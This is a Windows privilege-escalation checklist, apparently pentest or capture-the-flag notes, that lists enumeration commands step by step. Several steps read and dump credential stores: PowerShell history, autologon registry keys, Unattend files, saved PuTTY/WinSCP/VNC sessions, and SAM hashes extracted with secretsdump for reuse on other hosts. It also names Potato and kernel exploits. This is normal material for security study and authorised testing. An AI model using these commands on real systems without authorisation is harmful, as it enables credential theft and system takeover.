# Windows Privesc Checklist

> Run-through-in-order. Stop when you find something that escalates to
> Administrator / SYSTEM.

## Phase 1 — current user (60 seconds)

```powershell
whoami
whoami /all
whoami /priv
whoami /groups
hostname
systeminfo
Get-ChildItem Env:
```

- [ ] `whoami /priv` — `SeImpersonate` / `SeAssignPrimaryToken` Enabled?
- [ ] `whoami /priv` — `SeBackup` / `SeRestore` / `SeTakeOwnership`?
- [ ] `whoami /priv` — `SeDebug` / `SeLoadDriver` / `SeTcb`?
- [ ] `whoami /groups` — `BUILTIN\Administrators` (UAC dance only)?

## Phase 2 — credentials in default places

```powershell
# PowerShell history
Get-Content $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# autologon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Default* 2>$null

# cmdkey cache
cmdkey /list

# Sysprep / Unattend
Get-Content C:\Windows\Panther\Unattend.xml -ErrorAction SilentlyContinue
Get-Content C:\Windows\Panther\Unattended.xml -ErrorAction SilentlyContinue
Get-Content C:\Windows\System32\Sysprep\sysprep.xml -ErrorAction SilentlyContinue
Get-Content C:\Windows\System32\Sysprep\sysprep.inf -ErrorAction SilentlyContinue

# IIS web.config
Select-String -Path C:\inetpub\wwwroot\*\web.config -Pattern "password|connectionString" 2>$null
```

- [ ] PSReadline history grepped for password / -p flags?
- [ ] Winlogon registry checked (incl. Wow6432Node variant)?
- [ ] cmdkey list reviewed?
- [ ] Unattend / Sysprep XMLs inspected?
- [ ] web.config / appsettings.json connection strings extracted?

## Phase 3 — scheduled tasks / services

```powershell
# scheduled tasks running as another user
schtasks /query /fo LIST /v | findstr /i "TaskName Run As Action"

# services running with elevated privileges
Get-Service | Where-Object { $_.Status -eq 'Running' }
Get-WmiObject win32_service -Filter "startmode='auto'" | Select Name, PathName, StartName | Format-Table -AutoSize

# unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows" | findstr /i /v """

# weak service permissions
.\accesschk.exe -uwcqv "Authenticated Users" * 2>$null
```

- [ ] Scheduled tasks running as another user inspected?
- [ ] Service binaries / configs writable by current user?
- [ ] Unquoted service paths with writable parent dirs?
- [ ] Service registry keys writable?

## Phase 4 — installed software / privileged apps

```powershell
Get-WmiObject Win32_Product | Select Name, Version, Vendor
# alternatively (much faster)
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion, Publisher
```

- [ ] Backup software (NetBackup / Veeam / Acronis)?
- [ ] AV / EDR (which one — privesc primitives differ)?
- [ ] MSSQL / IIS / Tomcat / Jenkins?
- [ ] Splunk Universal Forwarder?
- [ ] Each installed software checked for known privesc CVEs?

## Phase 5 — registry secrets

```powershell
# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer 2>$null
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer 2>$null
# both 1 → MSI to SYSTEM

# putty saved sessions (sometimes contain creds)
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /s 2>$null

# WinSCP saved sessions
reg query HKCU\Software\Martin\ Prikryl\WinSCP\ 2>$null

# VNC password
reg query HKLM\SOFTWARE\TightVNC\ 2>$null
reg query HKLM\SOFTWARE\RealVNC\WinVNC4\ 2>$null
```

- [ ] AlwaysInstallElevated both 1?
- [ ] PuTTY / WinSCP / VNC saved sessions decoded?

## Phase 6 — local admin password reuse

```powershell
# from current host (if you have any admin)
reg save HKLM\SAM C:\Windows\Temp\sam.save 2>$null
reg save HKLM\SYSTEM C:\Windows\Temp\system.save 2>$null

# offline:
impacket-secretsdump LOCAL -system system.save -sam sam.save
```

- [ ] Local Administrator NTLM extracted from SAM?
- [ ] Tried against other hosts (CME `--local-auth`)?

## Phase 7 — network position

```powershell
ipconfig /all
arp -a
route print
ss -tlnp | findstr LISTEN              # via PowerShell — use Get-NetTCPConnection
Get-NetTCPConnection -State Listen | Select LocalAddress, LocalPort, OwningProcess
```

- [ ] Internal-only listening services found (`127.0.0.1:<port>`)?
- [ ] ARP / route table reveals lateral pivot targets?

## Phase 8 — ACLs on writable artefacts

```powershell
# user-writable in PATH
$env:Path -split ';' | ForEach-Object { Get-ChildItem $_ -ErrorAction SilentlyContinue }
# scrutinize entries

# writable folder?
icacls "C:\Program Files\<vendor>"
```

- [ ] Writable directory in PATH?
- [ ] Service binary path writable?
- [ ] Service registry key writable?

## Phase 9 — token impersonation prerequisites

```powershell
whoami /priv | findstr /i Impersonate
```

- [ ] Right Potato variant chosen for OS:
  - Win 7-10 (≤1803) / 2008-2016 → JuicyPotato
  - Win 10 (1809+) / 2019 → PrintSpoofer / RoguePotato
  - Modern → GodPotato

## Phase 10 — kernel / patches

```powershell
systeminfo > C:\Windows\Temp\sysinfo.txt
```

```bash
# off-host
wes.py sysinfo.txt -i 'Elevation of Privilege' -c | head -20
```

- [ ] Patch level analysed for known kernel privesc?
- [ ] Reliable PoCs (MS16-032, MS15-051, PrintNightmare) attempted?

## Phase 11 — automated

```powershell
.\winPEASany.exe quiet > peas.txt
type peas.txt | more
```

- [ ] WinPEAS run end-to-end?
- [ ] Red `[+]` findings followed up manually?

## Phase 12 — domain context

```powershell
whoami /groups | findstr /i "domain"
$env:USERDOMAIN
```

If domain-joined:
- [ ] Run BloodHound from current user.
- [ ] Pivot to AD attack chain (`methodology/07-ad-attack-chains.md`).

## Universal pivots if stuck

- Re-enumerate after running winPEAS on a fresh shell context.
- Try every captured credential against every other user.
- Look for non-default services / scheduled tasks created by the box's
  author.

## Related

- [`windows-privesc/token-impersonation.md`](../windows-privesc/token-impersonation.md)
- [`windows-privesc/winlogon-autologon.md`](../windows-privesc/winlogon-autologon.md)
- [`windows-privesc/kernel-exploits.md`](../windows-privesc/kernel-exploits.md)
- [`tool-usage/winpeas.md`](../tool-usage/winpeas.md)
- [`methodology/05-windows-attack-flow.md`](../methodology/05-windows-attack-flow.md)
- [`methodology/08-privilege-escalation-heuristics.md`](../methodology/08-privilege-escalation-heuristics.md)
